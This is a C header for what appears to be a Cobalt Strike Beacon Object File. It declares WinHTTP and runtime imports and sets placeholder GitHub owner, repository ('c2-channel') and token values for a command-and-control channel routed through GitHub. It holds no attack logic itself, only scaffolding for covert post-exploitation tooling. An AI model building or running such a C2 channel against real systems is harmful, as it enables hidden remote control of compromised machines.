#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winhttp.h>

#ifdef BOF
#include "beacon.h"

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR *, DWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpAddRequestHeaders(HINTERNET, LPCWSTR, DWORD, DWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(HINTERNET, LPVOID);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryHeaders(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryDataAvailable(HINTERNET, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReadData(HINTERNET, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetTimeouts(HINTERNET, int, int, int, int);

#define WinHttpOpen              WINHTTP$WinHttpOpen
#define WinHttpConnect           WINHTTP$WinHttpConnect
#define WinHttpOpenRequest       WINHTTP$WinHttpOpenRequest
#define WinHttpAddRequestHeaders WINHTTP$WinHttpAddRequestHeaders
#define WinHttpSendRequest       WINHTTP$WinHttpSendRequest
#define WinHttpReceiveResponse   WINHTTP$WinHttpReceiveResponse
#define WinHttpQueryHeaders      WINHTTP$WinHttpQueryHeaders
#define WinHttpQueryDataAvailable WINHTTP$WinHttpQueryDataAvailable
#define WinHttpReadData          WINHTTP$WinHttpReadData
#define WinHttpCloseHandle       WINHTTP$WinHttpCloseHandle
#define WinHttpSetTimeouts       WINHTTP$WinHttpSetTimeouts

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

#define GetProcessHeap KERNEL32$GetProcessHeap
#define HeapAlloc      KERNEL32$HeapAlloc
#define HeapFree       KERNEL32$HeapFree
#define Sleep          KERNEL32$Sleep
#define GetLastError   KERNEL32$GetLastError

DECLSPEC_IMPORT BOOLEAN WINAPI ADVAPI32$SystemFunction036(PVOID, ULONG);
#define SystemFunction036 ADVAPI32$SystemFunction036

DECLSPEC_IMPORT void *__cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memmove(void *, const void *, size_t);
DECLSPEC_IMPORT void *__cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void *, const void *, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *, const char *);
DECLSPEC_IMPORT int __cdecl MSVCRT$strncmp(const char *, const char *, size_t);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strstr(const char *, const char *);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strchr(const char *, int);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strcpy(char *, const char *);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strncpy(char *, const char *, size_t);
DECLSPEC_IMPORT char *__cdecl MSVCRT$strcat(char *, const char *);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
DECLSPEC_IMPORT unsigned long __cdecl MSVCRT$strtoul(const char *, char **, int);

#define memcpy   MSVCRT$memcpy
#define memmove  MSVCRT$memmove
#define memset   MSVCRT$memset
#define memcmp   MSVCRT$memcmp
#define strlen   MSVCRT$strlen
#define strcmp   MSVCRT$strcmp
#define strncmp  MSVCRT$strncmp
#define strstr   MSVCRT$strstr
#define strchr   MSVCRT$strchr
#define strcpy   MSVCRT$strcpy
#define strncpy  MSVCRT$strncpy
#define strcat   MSVCRT$strcat
#define xsnprintf MSVCRT$_snprintf
#define strtoul  MSVCRT$strtoul

#define LOG(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)
#define LOGERR(fmt, ...) BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__)

#else

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define xsnprintf snprintf
#define LOG(fmt, ...)    printf(fmt "\n", ##__VA_ARGS__)
#define LOGERR(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)

#endif

#ifndef GITHUB_OWNER
#define GITHUB_OWNER "example"
#endif
#ifndef GITHUB_REPO
#define GITHUB_REPO "c2-channel"
#endif
#ifndef GITHUB_PAT
#define GITHUB_PAT "ghp_dummy"
#endif

#ifndef BOF
BOOLEAN WINAPI SystemFunction036(PVOID RandomBuffer, ULONG RandomBufferLength);
#endif

void *xmalloc(size_t n);
void xfree(void *p);
int ascii_to_wide(const char *src, wchar_t *dst, int dst_wchars);
void skip_ws(const char **pp);
int random_bytes(void *buf, unsigned long n);
void bytes_to_hex(const unsigned char *in, int n, char *out);
